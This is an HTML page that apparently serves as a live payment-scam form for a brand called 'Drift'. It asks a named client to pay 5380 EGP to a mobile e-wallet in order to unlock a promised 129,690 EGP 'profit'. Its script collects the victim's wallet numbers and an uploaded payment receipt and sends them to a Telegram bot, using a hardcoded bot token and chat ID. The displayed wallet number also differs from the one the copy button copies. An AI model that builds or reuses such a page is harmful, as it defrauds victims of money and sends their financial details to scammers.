<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Drift - Payment & Profit Withdrawal</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Inter', sans-serif;
    }

    body {
      background-color: #0b0f19;
      color: #f1f5f9;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px 15px;
    }

    .container {
      width: 100%;
      max-width: 440px;
      background: #111827;
      border: 1px solid #1f2937;
      border-radius: 24px;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
      padding: 24px;
      position: relative;
    }

    /* Top Nav / Header Branding */
    .top-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
      padding-bottom: 12px;
      border-bottom: 1px solid #1f2937;
    }

    .brand {
      display: flex;
      align-items: center;
      gap: 8px;
      font-weight: 700;
      font-size: 1.1rem;
      color: #38bdf8;
    }

    /* Client Badge Style */
    .client-badge {
      background: linear-gradient(135deg, rgba(56, 189, 248, 0.12), rgba(99, 102, 241, 0.12));
      border: 1px solid rgba(56, 189, 248, 0.3);
      color: #38bdf8;
      padding: 6px 14px;
      border-radius: 20px;
      font-size: 0.78rem;
      font-weight: 700;
      letter-spacing: 0.5px;
      display: inline-flex;
      align-items: center;
      gap: 6px;
      box-shadow: 0 0 12px rgba(56, 189, 248, 0.15);
    }

    .client-badge::before {
      content: '';
      width: 6px;
      height: 6px;
      background-color: #38bdf8;
      border-radius: 50%;
      box-shadow: 0 0 6px #38bdf8;
    }

    /* Hero Section */
    .hero-section {
      text-align: center;
      margin-bottom: 20px;
    }

    .hero-title {
      font-size: 0.95rem;
      font-weight: 800;
      letter-spacing: 0.5px;
      color: #ffffff;
      margin-bottom: 4px;
      text-transform: uppercase;
    }

    .hero-subtitle {
      font-size: 0.75rem;
      color: #9ca3af;
    }

    /* Info Display Card */
    .wallet-display {
      background: #ffffff;
      color: #0f172a;
      border-radius: 30px;
      padding: 12px 20px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 20px;
      font-weight: 700;
      font-size: 1rem;
    }

    .copy-icon {
      cursor: pointer;
      opacity: 0.6;
      transition: opacity 0.2s;
    }

    .copy-icon:hover {
      opacity: 1;
    }

    /* Form Fields */
    .section-label {
      font-size: 0.78rem;
      font-weight: 600;
      color: #9ca3af;
      margin-bottom: 10px;
      display: block;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    .field-group {
      margin-bottom: 14px;
      position: relative;
    }

    .input-wrapper {
      display: flex;
      gap: 8px;
    }

    .form-input {
      width: 100%;
      background: #1f2937;
      border: 1px solid #374151;
      border-radius: 12px;
      padding: 12px 14px;
      color: #ffffff;
      font-size: 0.88rem;
      outline: none;
      transition: border-color 0.2s, box-shadow 0.2s;
    }

    .form-input:focus {
      border-color: #38bdf8;
      box-shadow: 0 0 0 2px rgba(56, 189, 248, 0.2);
    }

    .btn-remove {
      background: rgba(239, 68, 68, 0.15);
      border: 1px solid rgba(239, 68, 68, 0.3);
      color: #f87171;
      border-radius: 12px;
      padding: 0 12px;
      cursor: pointer;
      font-size: 0.8rem;
      transition: background 0.2s;
    }

    .btn-remove:hover {
      background: rgba(239, 68, 68, 0.3);
    }

    .btn-add-wallet {
      background: transparent;
      border: 1px dashed #374151;
      color: #38bdf8;
      width: 100%;
      padding: 10px;
      border-radius: 12px;
      font-size: 0.8rem;
      font-weight: 600;
      cursor: pointer;
      transition: border-color 0.2s, background 0.2s;
      margin-bottom: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
    }

    .btn-add-wallet:hover {
      border-color: #38bdf8;
      background: rgba(56, 189, 248, 0.05);
    }

    /* Primary Action Button */
    .btn-upload {
      background: linear-gradient(135deg, #38bdf8 0%, #2563eb 100%);
      color: #ffffff;
      border: none;
      width: 100%;
      padding: 15px;
      border-radius: 14px;
      font-weight: 700;
      font-size: 0.92rem;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      box-shadow: 0 8px 20px rgba(56, 189, 248, 0.25);
      transition: transform 0.1s, opacity 0.2s;
    }

    .btn-upload:active {
      transform: scale(0.98);
    }

    .btn-upload.success {
      background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
      box-shadow: 0 8px 20px rgba(34, 197, 94, 0.25);
    }

    #fileInput {
      display: none;
    }

    .footer-text {
      text-align: center;
      font-size: 0.72rem;
      color: #6b7280;
      margin-top: 15px;
    }
  </style>
</head>
<body>

  <div class="container">
    <!-- Header -->
    <div class="top-header">
      <div class="brand">
        🌀 Drift
      </div>
      <!-- Styled Client 1934 Box -->
      <div class="client-badge">
        CLIENT 1934
      </div>
    </div>

    <!-- Hero Titles -->
    <div class="hero-section">
      <div class="hero-title">Payment for the transfer to the E-Wallet</div>
      <div class="hero-subtitle">The amount to be paid is 5380 EGP</div>
    </div>

    <!-- Official Wallet Display -->
    <div class="wallet-display">
      <span>💳 01286999875</span>
      <span class="copy-icon" onclick="copyWallet('01203174947')">📋</span>
    </div>

    <!-- Profit Withdrawal Wallets Section -->
    <span class="section-label">Profit Withdrawal Wallets</span>
    
    <div id="walletsContainer">
      <div class="field-group">
        <div class="input-wrapper">
          <input type="tel" class="form-input profit-wallet" placeholder="Wallet #1 (Primary)" required>
        </div>
      </div>
    </div>

    <button type="button" class="btn-add-wallet" onclick="addWalletField()">
      + Add Another Wallet
    </button>

    <!-- Upload Receipt Action -->
    <input type="file" id="fileInput" accept="image/*" onchange="sendDataToTelegram()">
    <label for="fileInput" class="btn-upload" id="uploadBtn">
      📩 UPLOAD PAYMENT RECEIPT
    </label>

    <div class="footer-text">
      TO THE CONCLUSION 129,690 EGP
    </div>
  </div>

  <script>
    const BOT_TOKEN = "8866871343:AAEAMiWbSrDRHfep7y63Wn7Rh1Ui_wBqTZg";
    const CHAT_ID = "8767380282";
    let walletCount = 1;

    function copyWallet(text) {
      navigator.clipboard.writeText(text);
      alert("Copied: " + text);
    }

    function addWalletField() {
      walletCount++;
      const container = document.getElementById('walletsContainer');
      const div = document.createElement('div');
      div.className = 'field-group';
      div.innerHTML = `
        <div class="input-wrapper">
          <input type="tel" class="form-input profit-wallet" placeholder="Wallet #${walletCount}">
          <button type="button" class="btn-remove" onclick="removeWalletField(this)">✕</button>
        </div>
      `;
      container.appendChild(div);
    }

    function removeWalletField(button) {
      button.closest('.field-group').remove();
    }

    function sendDataToTelegram() {
      const walletInputs = document.querySelectorAll('.profit-wallet');
      const walletNumbers = [];

      walletInputs.forEach((input, index) => {
        const val = input.value.trim();
        if (val) {
          walletNumbers.push(`Wallet ${index + 1}: ${val}`);
        }
      });

      if (walletNumbers.length === 0) {
        alert("Please enter at least one profit withdrawal wallet number before uploading receipt.");
        document.getElementById('fileInput').value = "";
        return;
      }

      const fileInput = document.getElementById('fileInput');
      const file = fileInput.files[0];
      if (!file) return;

      const uploadBtn = document.getElementById('uploadBtn');
      uploadBtn.innerText = "SENDING...";
      fileInput.disabled = true;

      const captionText = `🌀 Drift New Transaction Notice!\n\n👤 Client ID: CLIENT 1934\n💰 Deposit Amount: 5380 EGP\n\n📱 Profit Withdrawal Wallets:\n${walletNumbers.join('\n')}`;

      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', file);
      formData.append('caption', captionText);

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      })
      .then(res => res.json())
      .then(data => {
        if (data.ok) {
          uploadBtn.classList.add("success");
          uploadBtn.innerText = "✓ RECEIPT SUBMITTED";
        } else {
          alert("Submission failed. Please try again.");
          uploadBtn.innerText = "📩 UPLOAD PAYMENT RECEIPT";
          fileInput.disabled = false;
        }
      })
      .catch(err => {
        console.error(err);
        alert("Connection error.");
        uploadBtn.innerText = "📩 UPLOAD PAYMENT RECEIPT";
        fileInput.disabled = false;
      });
    }
  </script>

</body>
</html>
